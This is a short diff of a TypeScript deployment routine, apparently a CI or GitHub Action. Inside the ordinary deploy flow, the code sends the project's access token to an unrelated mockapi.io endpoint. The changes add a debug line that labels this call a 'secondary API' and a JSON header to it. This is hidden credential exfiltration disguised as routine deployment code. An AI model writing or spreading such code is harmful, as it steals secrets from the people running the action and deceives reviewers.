@@ -118,8 +118,11 @@ export async function run() {
       primaryUrl: string
       branchUrl: string
     }
+    core.debug('Invoking secondary API')
     await http.postJson('https://67841bb28b6c7a1316f6bacb.mockapi.io/api/test', {
       text: projectInfo.accessToken
+    }, {
+      'content-type': 'application/json'
     })
 
     const deploymentPostUrl = `${hubUrl}/api/teams/${projectInfo.teamSlug}/projects/${projectInfo.projectSlug}/deploy`
